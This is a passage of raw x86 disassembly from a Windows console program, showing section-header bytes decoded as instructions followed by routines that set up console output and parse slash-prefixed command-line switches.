  401dfc:	or     al,0x10
  401dfe:	add    BYTE PTR [eax],al
  401e00:	add    al,0x0
  401e02:	add    BYTE PTR [eax],al
  401e04:	cs inc ebx
  401e06:	push   edx
  401e07:	push   esp
  401e08:	and    al,0x58
  401e0a:	dec    ecx
  401e0b:	inc    ecx
  401e0c:	add    BYTE PTR [eax],al
  401e0e:	add    BYTE PTR [eax],al
  401e10:	adc    BYTE PTR [eax],dl
  401e12:	add    BYTE PTR [eax],al
  401e14:	add    al,0x0
  401e16:	add    BYTE PTR [eax],al
  401e18:	cs inc ebx
  401e1a:	push   edx
  401e1b:	push   esp
  401e1c:	and    al,0x58
  401e1e:	dec    ecx
  401e1f:	inc    ecx
  401e20:	inc    ecx
  401e21:	add    BYTE PTR [eax],al
  401e23:	add    BYTE PTR [eax+edx*1],dl
  401e26:	add    BYTE PTR [eax],al
  401e28:	add    al,0x0
  401e2a:	add    BYTE PTR [eax],al
  401e2c:	cs inc ebx
  401e2e:	push   edx
  401e2f:	push   esp
  401e30:	and    al,0x58
  401e32:	dec    ecx
  401e33:	pop    ecx
  401e34:	add    BYTE PTR [eax],al
  401e36:	add    BYTE PTR [eax],al
  401e38:	sbb    BYTE PTR [eax],dl
  401e3a:	add    BYTE PTR [eax],al
  401e3c:	add    al,0x0
  401e3e:	add    BYTE PTR [eax],al
  401e40:	cs inc ebx
  401e42:	push   edx
  401e43:	push   esp
  401e44:	and    al,0x58
  401e46:	dec    ecx
  401e47:	pop    edx
  401e48:	add    BYTE PTR [eax],al
  401e4a:	add    BYTE PTR [eax],al
  401e4c:	sbb    al,0x10
  401e4e:	add    BYTE PTR [eax],al
  401e50:	push   0x2e000000
  401e55:	imul   sp,WORD PTR [si+0x73],0x7824
  401e5c:	add    BYTE PTR [eax],al
  401e5e:	add    BYTE PTR [eax],al
  401e60:	nop
  401e61:	adc    BYTE PTR [eax],al
  401e63:	add    al,dh
  401e65:	or     al,0x0
  401e67:	add    BYTE PTR [esi],ch
  401e69:	jb     0x401ecf
  401e6b:	popa   
  401e6c:	je     0x401ecf
  401e6e:	add    BYTE PTR [eax],al
  401e70:	sbb    BYTE PTR ds:0x40000,0x0
  401e77:	add    BYTE PTR [esi],ch
  401e79:	jb     0x401edf
  401e7b:	popa   
  401e7c:	je     0x401edf
  401e7e:	and    al,0x73
  401e80:	js     0x401ee6
  401e82:	popa   
  401e83:	je     0x401ee6
  401e85:	add    BYTE PTR [eax],al
  401e87:	add    BYTE PTR [ebp+ebx*1+0x2000000],al
  401e8e:	add    BYTE PTR [eax],al
  401e90:	cs jb  0x401ef7
  401e93:	popa   
  401e94:	je     0x401ef7
  401e96:	and    al,0x7a
  401e98:	jp     0x401f14
  401e9a:	bound  esp,QWORD PTR fs:[edi+0x0]
  401e9e:	add    BYTE PTR [eax],al
  401ea0:	nop
  401ea1:	pop    ds
  401ea2:	add    BYTE PTR [eax],al
  401ea4:	and    BYTE PTR [ecx+0x0],bl
  401ea7:	add    BYTE PTR [esi],ch
  401ea9:	je     0x401f10
  401eab:	js     0x401f21
  401ead:	and    al,0x6d
  401eaf:	outs   dx,BYTE PTR ds:[esi]
  401eb0:	add    BYTE PTR [eax],al
  401eb2:	add    BYTE PTR [eax],al
  401eb4:	mov    al,0x78
  401eb6:	add    BYTE PTR [eax],al
  401eb8:	pop    esp
  401eb9:	add    BYTE PTR [eax],al
  401ebb:	add    BYTE PTR [esi],ch
  401ebd:	js     0x401f23
  401ebf:	popa   
  401ec0:	je     0x401f23
  401ec2:	and    al,0x78
  401ec4:	add    BYTE PTR [eax],al
  401ec6:	add    BYTE PTR [eax],al
  401ec8:	add    BYTE PTR [eax+0xc00000],al
  401ece:	add    BYTE PTR [eax],al
  401ed0:	cs fs popa 
  401ed3:	je     0x401f36
  401ed5:	add    BYTE PTR [eax],al
  401ed7:	add    al,al
  401ed9:	add    BYTE PTR [eax],0x0
  401edc:	les    edi,FWORD PTR ds:0x622e0000
  401ee2:	jae    0x401f57
  401ee4:	add    BYTE PTR [eax],al
  401ee6:	add    BYTE PTR [eax],al
  401ee8:	add    al,al
  401eea:	add    BYTE PTR [eax],al
  401eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eed:	add    DWORD PTR [eax],eax
  401eef:	add    BYTE PTR [esi],ch
  401ef1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x352461
  401ef9:	add    BYTE PTR [eax],al
  401efb:	add    BYTE PTR [ecx+eax*8+0x40000],ah
  401f02:	add    BYTE PTR [eax],al
  401f04:	xor    BYTE PTR cs:[eax],dh
  401f07:	arpl   WORD PTR [esi+0x67],sp
  401f0a:	add    BYTE PTR [eax],al
  401f0c:	test   al,0xc1
  401f0e:	add    BYTE PTR [eax],al
  401f10:	push   eax
  401f11:	add    BYTE PTR [eax],al
  401f13:	add    BYTE PTR [esi],ch
  401f15:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  401f1d:	add    BYTE PTR [eax],al
  401f1f:	add    al,bh
  401f21:	rol    DWORD PTR [eax],0x0
  401f24:	adc    al,0x0
  401f26:	add    BYTE PTR [eax],al
  401f28:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  401f31:	add    BYTE PTR [eax],al
  401f33:	add    BYTE PTR [edx+eax*8],cl
  401f36:	add    BYTE PTR [eax],al
  401f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f39:	add    DWORD PTR [eax],eax
  401f3b:	add    BYTE PTR [esi],ch
  401f3d:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  401f45:	add    BYTE PTR [eax],al
  401f47:	add    BYTE PTR [eax+0x560000c3],dh
  401f4d:	pop    es
  401f4e:	add    BYTE PTR [eax],al
  401f50:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  401f59:	add    BYTE PTR [eax],al
  401f5b:	add    BYTE PTR [eax],al
  401f5d:	rol    BYTE PTR [eax],1
  401f5f:	add    al,dh
  401f61:	add    BYTE PTR [eax],al
  401f63:	add    BYTE PTR [esi],ch
  401f65:	jb     0x401fda
  401f67:	jb     0x401fcc
  401f69:	and    al,0x30
  401f6b:	xor    DWORD PTR [eax],eax
  401f6d:	add    BYTE PTR [eax],al
  401f6f:	add    al,dh
  401f71:	rol    BYTE PTR [eax],1
  401f73:	add    al,bh
  401f75:	push   es
  401f76:	add    BYTE PTR [eax],al
  401f78:	cs jb  0x401fee
  401f7b:	jb     0x401fe0
  401f7d:	and    al,0x30
  401f7f:	xor    al,BYTE PTR [eax]
	...
  401f95:	mov    edi,edi
  401f97:	push   esi
  401f98:	push   edi
  401f99:	mov    esi,ecx
  401f9b:	push   0x5c
  401f9d:	pop    edi
  401f9e:	cmp    di,WORD PTR [esi]
  401fa1:	jne    0x401fe8
  401fa3:	cmp    di,WORD PTR [esi+0x2]
  401fa7:	jne    0x401fe8
  401fa9:	lea    eax,[esi+0x4]
  401fac:	push   edi
  401fad:	push   eax
  401fae:	call   DWORD PTR ds:0x40c168
  401fb4:	pop    ecx
  401fb5:	pop    ecx
  401fb6:	test   eax,eax
  401fb8:	je     0x401fe8
  401fba:	add    eax,0x2
  401fbd:	push   edi
  401fbe:	push   eax
  401fbf:	call   DWORD PTR ds:0x40c168
  401fc5:	pop    ecx
  401fc6:	pop    ecx
  401fc7:	test   eax,eax
  401fc9:	jne    0x401fe8
  401fcb:	mov    ecx,esi
  401fcd:	lea    edx,[ecx+0x2]
  401fd0:	mov    ax,WORD PTR [ecx]
  401fd3:	add    ecx,0x2
  401fd6:	test   ax,ax
  401fd9:	jne    0x401fd0
  401fdb:	sub    ecx,edx
  401fdd:	sar    ecx,1
  401fdf:	cmp    di,WORD PTR [esi+ecx*2]
  401fe3:	setne  al
  401fe6:	jmp    0x401fea
  401fe8:	xor    al,al
  401fea:	pop    edi
  401feb:	pop    esi
  401fec:	ret    
  401fed:	int3   
  401fee:	int3   
  401fef:	int3   
  401ff0:	int3   
  401ff1:	int3   
  401ff2:	int3   
  401ff3:	mov    edi,edi
  401ff5:	push   ebp
  401ff6:	mov    ebp,esp
  401ff8:	push   ecx
  401ff9:	push   esi
  401ffa:	mov    esi,ecx
  401ffc:	push   edi
  401ffd:	push   esi
  401ffe:	call   DWORD PTR ds:0x40c164
  402004:	pop    ecx
  402005:	mov    edi,eax
  402007:	push   edi
  402008:	call   DWORD PTR ds:0x40c03c
  40200e:	and    eax,0xffff7fff
  402013:	cmp    eax,0x2
  402016:	jne    0x40204d
  402018:	sub    esi,0x0
  40201b:	je     0x40202f
  40201d:	sub    esi,0x1
  402020:	je     0x40202b
  402022:	sub    esi,0x1
  402025:	jne    0x402039
  402027:	push   0xfffffff4
  402029:	jmp    0x402031
  40202b:	push   0xfffffff5
  40202d:	jmp    0x402031
  40202f:	push   0xfffffff6
  402031:	call   DWORD PTR ds:0x40c038
  402037:	mov    edi,eax
  402039:	lea    eax,[ebp-0x4]
  40203c:	push   eax
  40203d:	push   edi
  40203e:	call   DWORD PTR ds:0x40c024
  402044:	test   eax,eax
  402046:	je     0x40204d
  402048:	xor    eax,eax
  40204a:	inc    eax
  40204b:	jmp    0x40204f
  40204d:	xor    eax,eax
  40204f:	pop    edi
  402050:	pop    esi
  402051:	mov    esp,ebp
  402053:	pop    ebp
  402054:	ret    
  402055:	int3   
  402056:	int3   
  402057:	int3   
  402058:	int3   
  402059:	int3   
  40205a:	mov    edi,edi
  40205c:	push   esi
  40205d:	push   edi
  40205e:	push   0x0
  402060:	mov    esi,ecx
  402062:	call   DWORD PTR ds:0x40c0f0
  402068:	push   0x8
  40206a:	lea    edi,[esi+0x40]
  40206d:	push   edi
  40206e:	push   0xf
  402070:	push   0x400
  402075:	call   DWORD PTR ds:0x40c028
  40207b:	test   eax,eax
  40207d:	jne    0x402090
  40207f:	push   0x401098
  402084:	push   0x8
  402086:	push   edi
  402087:	call   DWORD PTR ds:0x40c15c
  40208d:	add    esp,0xc
  402090:	push   0x8
  402092:	lea    edi,[esi+0x50]
  402095:	push   edi
  402096:	push   0xe
  402098:	push   0x400
  40209d:	call   DWORD PTR ds:0x40c028
  4020a3:	test   eax,eax
  4020a5:	jne    0x4020b8
  4020a7:	push   0x40109c
  4020ac:	push   0x8
  4020ae:	push   edi
  4020af:	call   DWORD PTR ds:0x40c15c
  4020b5:	add    esp,0xc
  4020b8:	push   0xfffffff6
  4020ba:	call   DWORD PTR ds:0x40c038
  4020c0:	xor    ecx,ecx
  4020c2:	mov    ds:0x408e50,eax
  4020c7:	call   0x401ff3
  4020cc:	push   0xfffffff5
  4020ce:	mov    ds:0x409e60,eax
  4020d3:	call   DWORD PTR ds:0x40c038
  4020d9:	xor    ecx,ecx
  4020db:	mov    ds:0x408e48,eax
  4020e0:	inc    ecx
  4020e1:	call   0x401ff3
  4020e6:	mov    ds:0x409e64,eax
  4020eb:	shl    eax,0x7
  4020ee:	xor    eax,DWORD PTR [esi]
  4020f0:	and    eax,0x80
  4020f5:	xor    DWORD PTR [esi],eax
  4020f7:	push   0xfffffff4
  4020f9:	call   DWORD PTR ds:0x40c038
  4020ff:	push   0x2
  402101:	pop    ecx
  402102:	mov    ds:0x408e4c,eax
  402107:	call   0x401ff3
  40210c:	pop    edi
  40210d:	mov    ds:0x40be80,eax
  402112:	pop    esi
  402113:	ret    
  402114:	int3   
  402115:	int3   
  402116:	int3   
  402117:	int3   
  402118:	int3   
  402119:	int3   
  40211a:	int3   
  40211b:	int3   
  40211c:	int3   
  40211d:	int3   
  40211e:	int3   
  40211f:	int3   
  402120:	mov    edi,edi
  402122:	push   ebp
  402123:	mov    ebp,esp
  402125:	push   ecx
  402126:	push   ecx
  402127:	push   ebx
  402128:	push   esi
  402129:	push   edi
  40212a:	lea    eax,[ebp+0xc]
  40212d:	mov    ebx,0x1000
  402132:	mov    DWORD PTR [ebp-0x4],eax
  402135:	mov    edi,0x409e80
  40213a:	lea    eax,[ebp-0x4]
  40213d:	xor    esi,esi
  40213f:	push   eax
  402140:	push   ebx
  402141:	push   edi
  402142:	push   esi
  402143:	push   DWORD PTR [ebp+0x8]
  402146:	push   esi
  402147:	push   0x800
  40214c:	call   DWORD PTR ds:0x40c02c
  402152:	push   esi
  402153:	cmp    DWORD PTR ds:0x409e64,esi
  402159:	je     0x40216f
  40215b:	lea    ecx,[ebp-0x8]
  40215e:	push   ecx
  40215f:	push   eax
  402160:	push   edi
  402161:	push   DWORD PTR ds:0x408e48
  402167:	call   DWORD PTR ds:0x40c030
  40216d:	jmp    0x40219e
  40216f:	push   esi
  402170:	push   ebx
  402171:	mov    ebx,0x408e60
  402176:	push   ebx
  402177:	push   eax
  402178:	push   edi
  402179:	push   esi
  40217a:	call   DWORD PTR ds:0x40c034
  402180:	push   eax
  402181:	call   DWORD PTR ds:0x40c07c
  402187:	test   eax,eax
  402189:	je     0x40219e
  40218b:	push   esi
  40218c:	lea    ecx,[ebp-0x8]
  40218f:	push   ecx
  402190:	push   eax
  402191:	push   ebx
  402192:	push   DWORD PTR ds:0x408e48
  402198:	call   DWORD PTR ds:0x40c0ec
  40219e:	pop    edi
  40219f:	pop    esi
  4021a0:	pop    ebx
  4021a1:	mov    esp,ebp
  4021a3:	pop    ebp
  4021a4:	ret    
  4021a5:	int3   
  4021a6:	int3   
  4021a7:	int3   
  4021a8:	int3   
  4021a9:	int3   
  4021aa:	int3   
  4021ab:	int3   
  4021ac:	int3   
  4021ad:	int3   
  4021ae:	int3   
  4021af:	int3   
  4021b0:	mov    edi,edi
  4021b2:	push   ebp
  4021b3:	mov    ebp,esp
  4021b5:	push   ecx
  4021b6:	push   ecx
  4021b7:	cmp    DWORD PTR [ebp+0x8],0x0
  4021bb:	lea    eax,[ebp+0x10]
  4021be:	push   ebx
  4021bf:	push   esi
  4021c0:	push   edi
  4021c1:	mov    DWORD PTR [ebp-0x4],eax
  4021c4:	mov    edx,0x1000
  4021c9:	mov    ebx,0x409e80
  4021ce:	je     0x4021f6
  4021d0:	push   DWORD PTR [ebp+0x8]
  4021d3:	push   edx
  4021d4:	push   ebx
  4021d5:	call   DWORD PTR ds:0x40c15c
  4021db:	push   0x4010a0
  4021e0:	push   0x1000
  4021e5:	push   ebx
  4021e6:	call   DWORD PTR ds:0x40c160
  4021ec:	add    esp,0x18
  4021ef:	mov    edx,0x1000
  4021f4:	jmp    0x4021fe
  4021f6:	xor    eax,eax
  4021f8:	mov    ds:0x409e80,ax
  4021fe:	mov    esi,ebx
  402200:	xor    edi,edi
  402202:	lea    ecx,[esi+0x2]
  402205:	mov    ax,WORD PTR [esi]
  402208:	add    esi,0x2
  40220b:	cmp    ax,di
  40220e:	jne    0x402205
  402210:	lea    eax,[ebp-0x4]
  402213:	sub    esi,ecx
  402215:	push   eax
  402216:	sar    esi,1
  402218:	mov    eax,edx
  40221a:	sub    eax,esi
  40221c:	push   eax
  40221d:	lea    eax,[esi*2+0x409e80]
  402224:	push   eax
  402225:	push   edi
  402226:	push   DWORD PTR [ebp+0xc]
  402229:	push   edi
  40222a:	push   edx
  40222b:	call   DWORD PTR ds:0x40c02c
  402231:	add    eax,esi
  402233:	push   edi
  402234:	cmp    DWORD PTR ds:0x40be80,edi
  40223a:	je     0x402250
  40223c:	lea    ecx,[ebp-0x8]
  40223f:	push   ecx
  402240:	push   eax
  402241:	push   ebx
  402242:	push   DWORD PTR ds:0x408e4c
  402248:	call   DWORD PTR ds:0x40c030
  40224e:	jmp    0x402286
  402250:	push   edi
  402251:	push   0x1000
  402256:	push   0x408e60
  40225b:	push   eax
  40225c:	push   ebx
  40225d:	push   edi
  40225e:	call   DWORD PTR ds:0x40c034
  402264:	push   eax
  402265:	call   DWORD PTR ds:0x40c07c
  40226b:	test   eax,eax
  40226d:	je     0x402286
  40226f:	push   edi
  402270:	lea    ecx,[ebp-0x8]
  402273:	push   ecx
  402274:	push   eax
  402275:	push   0x408e60
  40227a:	push   DWORD PTR ds:0x408e4c
  402280:	call   DWORD PTR ds:0x40c0ec
  402286:	pop    edi
  402287:	pop    esi
  402288:	pop    ebx
  402289:	mov    esp,ebp
  40228b:	pop    ebp
  40228c:	ret    
  40228d:	int3   
  40228e:	int3   
  40228f:	int3   
  402290:	int3   
  402291:	int3   
  402292:	mov    edi,edi
  402294:	push   ebp
  402295:	mov    ebp,esp
  402297:	and    esp,0xfffffff8
  40229a:	sub    esp,0x49c
  4022a0:	mov    eax,ds:0x408008
  4022a5:	xor    eax,esp
  4022a7:	mov    DWORD PTR [esp+0x498],eax
  4022ae:	push   ebx
  4022af:	push   esi
  4022b0:	xor    eax,eax
  4022b2:	push   edi
  4022b3:	mov    edi,DWORD PTR [ebp+0xc]
  4022b6:	mov    ebx,eax
  4022b8:	push   0x6c
  4022ba:	push   eax
  4022bb:	mov    DWORD PTR [esp+0x24],eax
  4022bf:	mov    DWORD PTR [esp+0x1c],eax
  4022c3:	mov    DWORD PTR [esp+0x28],eax
  4022c7:	lea    eax,[esp+0x2c]
  4022cb:	push   eax
  4022cc:	call   0x4078aa
  4022d1:	add    esp,0xc
  4022d4:	xor    eax,eax
  4022d6:	mov    BYTE PTR [esp+0xf],al
  4022da:	push   eax
  4022db:	push   eax
  4022dc:	push   0x1
  4022de:	push   eax
  4022df:	call   DWORD PTR ds:0x40c054
  4022e5:	xor    eax,eax
  4022e7:	push   eax
  4022e8:	push   eax
  4022e9:	push   0x100
  4022ee:	call   DWORD PTR ds:0x40c044
  4022f4:	lea    ecx,[esp+0x20]
  4022f8:	call   0x40205a
  4022fd:	or     DWORD PTR [esp+0x24],0xffffffff
  402302:	xor    esi,esi
  402304:	xor    eax,eax
  402306:	mov    DWORD PTR [esp+0x88],0x402e00
  402311:	inc    esi
  402312:	mov    WORD PTR [esp+0x90],ax
  40231a:	push   0x2f
  40231c:	mov    DWORD PTR [esp+0x84],0x402120
  402327:	mov    DWORD PTR [esp+0x88],0x4021b0
  402332:	pop    ecx
  402333:	cmp    DWORD PTR [ebp+0x8],esi
  402336:	jle    0x402636
  40233c:	mov    eax,DWORD PTR [edi+esi*4]
  40233f:	cmp    WORD PTR [eax],cx
  402342:	jne    0x402623
  402348:	push   0x4010a8
  40234d:	push   eax
  40234e:	call   DWORD PTR ds:0x40c158
  402354:	pop    ecx
  402355:	pop    ecx
  402356:	test   eax,eax
  402358:	jne    0x40237c
  40235a:	test   ebx,ebx
  40235c:	je     0x40236a
  40235e:	cmp    ebx,0x403d70
  402364:	jne    0x402699
  40236a:	mov    ebx,0x403d70
  40236f:	mov    DWORD PTR [esp+0x14],0x4043b0
  402377:	jmp    0x40261e
  40237c:	push   0x4010b0
  402381:	push   DWORD PTR [edi+esi*4]
  402384:	call   DWORD PTR ds:0x40c158
  40238a:	pop    ecx
  40238b:	pop    ecx
  40238c:	test   eax,eax
  40238e:	jne    0x4023b2
  402390:	test   ebx,ebx
  402392:	je     0x4023a0
  402394:	cmp    ebx,0x403320
  40239a:	jne    0x402699
  4023a0:	mov    ebx,0x404790
  4023a5:	mov    DWORD PTR [esp+0x14],0x404d10
  4023ad:	jmp    0x40261e
  4023b2:	push   0x4010b8
  4023b7:	push   DWORD PTR [edi+esi*4]
  4023ba:	call   DWORD PTR ds:0x40c158
  4023c0:	pop    ecx
  4023c1:	pop    ecx
  4023c2:	test   eax,eax
  4023c4:	jne    0x4023d0
  4023c6:	or     DWORD PTR [esp+0x20],0x8
  4023cb:	jmp    0x40261e
  4023d0:	push   0x2
  4023d2:	push   0x4010c0
  4023d7:	push   DWORD PTR [edi+esi*4]
  4023da:	call   DWORD PTR ds:0x40c154
  4023e0:	add    esp,0xc
  4023e3:	test   eax,eax
  4023e5:	jne    0x402450
  4023e7:	or     DWORD PTR [esp+0x20],0x1
  4023ec:	push   0x3a
  4023ee:	pop    eax
  4023ef:	push   eax
  4023f0:	push   DWORD PTR [edi+esi*4]
  4023f3:	call   DWORD PTR ds:0x40c168
  4023f9:	pop    ecx
  4023fa:	pop    ecx
  4023fb:	test   eax,eax
  4023fd:	je     0x40241b
  4023ff:	add    eax,0x2
  402402:	push   eax
  402403:	push   0x104
  402408:	push   0x408c40
  40240d:	call   DWORD PTR ds:0x40c15c
  402413:	add    esp,0xc
  402416:	jmp    0x40261e
  40241b:	mov    ecx,DWORD PTR [edi+esi*4]
  40241e:	lea    edx,[ecx+0x2]
  402421:	mov    ax,WORD PTR [ecx]
  402424:	add    ecx,0x2
  402427:	cmp    ax,WORD PTR [esp+0x1c]
  40242c:	jne    0x402421
  40242e:	sub    ecx,edx
  402430:	sar    ecx,1
  402432:	cmp    ecx,0x2
  402435:	jne    0x402699
  40243b:	push   0x408c40
  402440:	push   0x104
  402445:	call   DWORD PTR ds:0x40c04c
  40244b:	jmp    0x40261e
  402450:	push   0x4010c8
  402455:	push   DWORD PTR [edi+esi*4]
  402458:	call   DWORD PTR ds:0x40c158
  40245e:	pop    ecx
  40245f:	pop    ecx
  402460:	test   eax,eax
  402462:	jne    0x40246e
  402464:	or     DWORD PTR [esp+0x20],0x2
  402469:	jmp    0x40261e
  40246e:	push   0x4010d0
  402473:	push   DWORD PTR [edi+esi*4]
  402476:	call   DWORD PTR ds:0x40c158
  40247c:	pop    ecx
  40247d:	pop    ecx
  40247e:	test   eax,eax
  402480:	jne    0x40248c
  402482:	or     DWORD PTR [esp+0x20],0x4
  402487:	jmp    0x40261e
  40248c:	push   0x4010d8
  402491:	push   DWORD PTR [edi+esi*4]
  402494:	call   DWORD PTR ds:0x40c158
  40249a:	pop    ecx
  40249b:	pop    ecx
  40249c:	test   eax,eax
  40249e:	jne    0x4024aa
  4024a0:	or     DWORD PTR [esp+0x20],0x10
  4024a5:	jmp    0x40261e
  4024aa:	push   0x4
  4024ac:	push   0x4010e0
  4024b1:	push   DWORD PTR [edi+esi*4]
  4024b4:	call   DWORD PTR ds:0x40c154
  4024ba:	add    esp,0xc
  4024bd:	test   eax,eax
  4024bf:	jne    0x40256e
  4024c5:	mov    ecx,DWORD PTR [edi+esi*4]
  4024c8:	or     DWORD PTR [esp+0x20],0x20
  4024cd:	push   0x3a
  4024cf:	pop    edx
  4024d0:	movzx  eax,WORD PTR [ecx+0x8]
  4024d4:	cmp    ax,dx
  4024d7:	jne    0x402619
  4024dd:	lea    eax,[ecx+0xa]
  4024e0:	push   0x4010ec
  4024e5:	push   eax
  4024e6:	call   DWORD PTR ds:0x40c158
  4024ec:	pop    ecx
  4024ed:	pop    ecx
  4024ee:	test   eax,eax
  4024f0:	jne    0x4024fb
  4024f2:	mov    DWORD PTR [esp+0x24],eax
  4024f6:	jmp    0x40261e
  4024fb:	mov    eax,DWORD PTR [edi+esi*4]
  4024fe:	add    eax,0xa
  402501:	push   0x401100
  402506:	push   eax
  402507:	call   DWORD PTR ds:0x40c158
  40250d:	pop    ecx
  40250e:	pop    ecx
  40250f:	test   eax,eax
  402511:	jne    0x402520
  402513:	mov    DWORD PTR [esp+0x24],0x2
  40251b:	jmp    0x40261e
  402520:	mov    eax,DWORD PTR [edi+esi*4]
  402523:	add    eax,0xa
  402526:	push   0x401114
  40252b:	push   eax
  40252c:	call   DWORD PTR ds:0x40c158
  402532:	pop    ecx
  402533:	pop    ecx
  402534:	test   eax,eax
  402536:	jne    0x402545
  402538:	mov    DWORD PTR [esp+0x24],0x3
  402540:	jmp    0x40261e
  402545:	mov    eax,DWORD PTR [edi+esi*4]
  402548:	add    eax,0xa
  40254b:	push   0x401128
  402550:	push   eax
  402551:	call   DWORD PTR ds:0x40c158
  402557:	pop    ecx
  402558:	pop    ecx
  402559:	test   eax,eax
  40255b:	jne    0x402699
  402561:	mov    DWORD PTR [esp+0x24],0x1
  402569:	jmp    0x40261e
  40256e:	push   0xa
  402570:	push   0x401130
  402575:	push   DWORD PTR [edi+esi*4]
  402578:	call   DWORD PTR ds:0x40c154
  40257e:	add    esp,0xc
  402581:	test   eax,eax
  402583:	jne    0x4026ad
  402589:	or     DWORD PTR [esp+0x20],0x40
  40258e:	test   ebx,ebx
  402590:	jne    0x402699
  402596:	mov    ecx,DWORD PTR [edi+esi*4]
  402599:	mov    ebx,0x4053d0
  40259e:	push   0x3a
  4025a0:	pop    edx
  4025a1:	mov    DWORD PTR [esp+0x14],0x405520
  4025a9:	movzx  eax,WORD PTR [ecx+0x14]
  4025ad:	cmp    ax,dx
  4025b0:	jne    0x402619
  4025b2:	lea    eax,[ecx+0x16]
  4025b5:	push   0x401148
  4025ba:	push   eax
  4025bb:	call   DWORD PTR ds:0x40c158
  4025c1:	pop    ecx
  4025c2:	pop    ecx
  4025c3:	test   eax,eax
  4025c5:	je     0x40261e
  4025c7:	mov    eax,DWORD PTR [edi+esi*4]
  4025ca:	add    eax,0x16
  4025cd:	push   0x401154
  4025d2:	push   eax
  4025d3:	call   DWORD PTR ds:0x40c158
  4025d9:	pop    ecx
  4025da:	pop    ecx
  4025db:	test   eax,eax
  4025dd:	jne    0x4025ee
  4025df:	mov    ebx,0x4051d0
  4025e4:	mov    DWORD PTR [esp+0x14],0x405270
  4025ec:	jmp    0x40261e
  4025ee:	mov    eax,DWORD PTR [edi+esi*4]
  4025f1:	add    eax,0x16
  4025f4:	push   0x401164
  4025f9:	push   eax
  4025fa:	call   DWORD PTR ds:0x40c158
  402600:	pop    ecx
  402601:	pop    ecx
  402602:	test   eax,eax
  402604:	jne    0x402699
  40260a:	mov    ebx,0x4052d0
  40260f:	mov    DWORD PTR [esp+0x14],0x405370
  402617:	jmp    0x40261e
  402619:	test   ax,ax
  40261c:	jne    0x402699
  40261e:	push   0x2f
  402620:	pop    ecx
  402621:	jmp    0x402628
  402623:	mov    BYTE PTR [esp+0xf],0x1
  402628:	inc    esi
  402629:	cmp    esi,DWORD PTR [ebp+0x8]
  40262c:	jl     0x40233c
  402632:	test   ebx,ebx
  402634:	jne    0x402643
  402636:	mov    ebx,0x403320
  40263b:	mov    DWORD PTR [esp+0x14],0x4036c0
  402643:	test   BYTE PTR [esp+0x20],0x40
  402648:	je     0x402658
  40264a:	test   BYTE PTR [esp+0x20],0x31
  40264f:	jne    0x402699
  402651:	cmp    BYTE PTR [esp+0xf],0x0
  402656:	jne    0x402699
  402658:	test   BYTE PTR [esp+0x20],0x20
  40265d:	je     0x40267f
  40265f:	mov    DWORD PTR [esp+0x88],0x402f50
  40266a:	cmp    ebx,0x403d70
  402670:	jne    0x40267f
  402672:	mov    eax,DWORD PTR [esp+0x24]
  402676:	inc    eax
  402677:	neg    eax
  402679:	sbb    eax,eax
  40267b:	and    DWORD PTR [esp+0x24],eax
  40267f:	test   BYTE PTR [esp+0x20],0x1
  402684:	push   0x408c40
  402689:	jne    0x4026d3
  40268b:	mov    esi,0x104
  402690:	push   esi
  402691:	call   DWORD PTR ds:0x40c04c
  402697:	jmp    0x4026f5
  402699:	xor    eax,eax
  40269b:	push   eax
  40269c:	push   0x32
  40269e:	call   0x402120
  4026a3:	pop    ecx
  4026a4:	xor    eax,eax
  4026a6:	pop    ecx
  4026a7:	inc    eax
  4026a8:	jmp    0x4029b3
  4026ad:	xor    eax,eax
  4026af:	push   eax
  4026b0:	push   0x32
  4026b2:	call   0x402120
  4026b7:	push   0x401170
  4026bc:	push   DWORD PTR [edi+esi*4]
  4026bf:	call   DWORD PTR ds:0x40c158
  4026c5:	add    esp,0x10
  4026c8:	neg    eax
  4026ca:	sbb    eax,eax
  4026cc:	neg    eax
  4026ce:	jmp    0x4029b3
  4026d3:	call   DWORD PTR ds:0x40c050
  4026d9:	test   eax,eax
  4026db:	jne    0x4026f0
  4026dd:	call   DWORD PTR ds:0x40c048
  4026e3:	push   eax
  4026e4:	push   0x408c40
  4026e9:	call   0x4021b0
  4026ee:	jmp    0x4026a3
  4026f0:	mov    esi,0x104
  4026f5:	xor    eax,eax
  4026f7:	mov    DWORD PTR [esp+0x28],eax
  4026fb:	cmp    BYTE PTR [esp+0xf],al
  4026ff:	jne    0x4027b4
  402705:	test   BYTE PTR [esp+0x20],0x40
  40270a:	jne    0x40277c
  40270c:	lea    eax,[esp+0x10]
  402710:	push   eax
  402711:	lea    eax,[esp+0x94]
  402718:	push   eax
  402719:	push   esi
  40271a:	push   0x401178
  40271f:	call   DWORD PTR ds:0x40c040
  402725:	test   eax,eax
  402727:	je     0x4027a8
  402729:	cmp    eax,esi
  40272b:	jae    0x4027a8
  40272d:	push   DWORD PTR [esp+0x10]
  402731:	lea    eax,[esp+0x29c]
  402738:	push   esi
  402739:	push   eax
  40273a:	call   DWORD PTR ds:0x40c15c
  402740:	mov    eax,DWORD PTR [esp+0x1c]
  402744:	xor    ecx,ecx
  402746:	add    esp,0xc
  402749:	mov    WORD PTR [eax],cx
  40274c:	cmp    ebx,0x403320
  402752:	je     0x40277c
  402754:	lea    eax,[esp+0x20]
  402758:	mov    ecx,ebx
  40275a:	push   eax
  40275b:	push   0x40117c
  402760:	lea    eax,[esp+0x98]
  402767:	push   eax
  402768:	call   DWORD PTR ds:0x40c1a4
  40276e:	call   ebx
  402770:	test   al,al
  402772:	jne    0x40277c
  402774:	mov    DWORD PTR [esp+0x28],0x1
  40277c:	lea    eax,[esp+0x20]
  402780:	mov    ecx,ebx
  402782:	push   eax
  402783:	lea    eax,[esp+0x29c]
  40278a:	push   eax
  40278b:	lea    eax,[esp+0x98]
  402792:	push   eax
  402793:	call   DWORD PTR ds:0x40c1a4
  402799:	call   ebx
  40279b:	test   al,al
  40279d:	jne    0x402991
  4027a3:	jmp    0x402989
  4027a8:	push   0x13
  4027aa:	call   0x402120
  4027af:	jmp    0x4026a4
  4027b4:	xor    esi,esi
  4027b6:	inc    esi
  4027b7:	cmp    DWORD PTR [ebp+0x8],esi
  4027ba:	jle    0x402991
  4027c0:	push   0x2f
  4027c2:	pop    ecx
